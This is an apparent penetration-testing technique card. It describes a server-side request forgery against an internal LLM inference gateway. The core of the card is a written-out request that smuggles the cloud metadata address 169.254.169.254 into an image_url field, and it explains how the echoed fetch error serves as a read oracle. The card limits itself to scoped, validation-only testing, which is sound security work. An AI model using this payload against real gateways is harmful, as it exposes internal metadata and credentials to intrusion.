# The primitive — mobile / machine

- source canon: `holyshit-mode/vllm-gateway-internal-fleet-ssrf.md`
- base technique: `holyshit-mode-vllm-gateway-internal-fleet-ssrf-the-primitive.md`
- bindings: **MASTG-RES** · **CWE-494** · **ATT&CK T1601**
- context: **mobile** · auth **machine** · chain role **pivot**

## Route

- probes: `nmap-script-default`, `httpx`, `whatweb`, `webanalyze`
- chains: `recon`
- gate: every probe runs through the shared scope authority (rc=1 out of estate); the 3-gate differential turns output into a finding

## Context

- platform: the client is another principal — storage/permission surface, own device only
- auth state: the principal is a SERVICE identity (API key, SA token, CI secret, webhook signing key): the differential is the KEY's resource scope — key-level vs user-level objects, cross-tenant reach, unscoped keys, and which audit trail the key leaves; the human account model does not apply

## The technique

```
POST https://<internal-gateway>/invocations
{"model":"deepseek-v4-flash",
 "messages":[{"role":"user","content":[
   {"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]}]}
```
→ `422 {"error":{"message":"Failed to fetch media from URL: HTTP 404 error (parameter=image_url,
value=http://169.254.169.254/latest/meta-data/)"}}`
The `HTTP 404 error` is the **server-side fetch result echoed back** — your read oracle.

## Probe adjustment (mobile × machine)

1. baseline first: the request/session with NOTHING changed
2. attack: the documented class probe, adjusted per context above
3. diff: measurable only — status/length/body — or it is not a finding

## Chain roles

- combines with a prior finding — chain detect pairs same-origin findings
- pairs-with: see `skilltree-index.md` for the sibling techniques

## Walls

- validation-only · NO-GAIN · documented-class adaptation only
- in-scope only: the scope authority refuses everything else (rc=1)
